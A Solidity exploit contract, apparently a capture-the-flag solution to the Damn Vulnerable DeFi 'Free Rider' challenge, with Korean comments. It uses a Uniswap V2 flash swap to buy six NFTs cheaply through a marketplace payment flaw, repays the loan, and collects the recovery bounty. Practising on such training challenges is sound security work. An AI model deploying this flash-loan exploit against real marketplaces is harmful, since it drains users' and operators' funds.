pragma solidity =0.8.25;

import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract Attack is IERC721Receiver {
    IUniswapV2Pair uniswapV2Pair;
    FreeRiderNFTMarketplace marketplace;
    FreeRiderRecoveryManager recoveryManager;
    DamnValuableNFT nft;
    WETH weth;
    address token0;
    address token1;

    constructor(address _uniswapV2Pair, address _marketplace, address _recoveryManager){
        uniswapV2Pair = IUniswapV2Pair(_uniswapV2Pair);
        token0 = uniswapV2Pair.token0();
        token1 = uniswapV2Pair.token1();
        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
        recoveryManager = FreeRiderRecoveryManager(payable(_recoveryManager));
        nft = marketplace.token();
    }

    function flashswap(address token, uint amount) external {
        (uint256 amount0Out, uint256 amount1Out) =
            token == token0 ? (amount, uint256(0)) : (uint256(0), amount);

        bytes memory data = abi.encode(token, msg.sender);

        uniswapV2Pair.swap({
            amount0Out : amount0Out, 
            amount1Out : amount1Out, 
            to : address(this), 
            data : data
        }); 
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        (address token, address caller) = abi.decode(data, (address, address));
        uint256 amount = token == token0 ? amount0 : amount1;

        // ETH로 변환
        WETH(payable(token)).withdraw(amount);

        // NFT 6개 구매
        buyNFTs();

        // 마켓 플레이스 취약점으로 NFT 6개에 대한 90ETH 수신 후 15WETH를 반납해야 함
        WETH(payable(token)).deposit{value : amount}();

        // flashswap fee 계산
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        // flashswap fee 걷어오기
        IERC20(token).transferFrom(caller, address(this), fee);
        // flashswap 상환
        IERC20(token).transfer(address(uniswapV2Pair), amountToRepay);
    }

    function buyNFTs() public payable {
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        marketplace.buyMany{value : 15 ether}(tokenIds);
    }

    function sendNFTsToRecoveryManager() public {
        bytes memory data = abi.encode(address(this));

        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(recoveryManager), i, data);
        }
    }

    function sendAllETHToPlayer() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    function onERC721Received(address, address, uint256, bytes calldata data) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }


    receive() external payable {}
}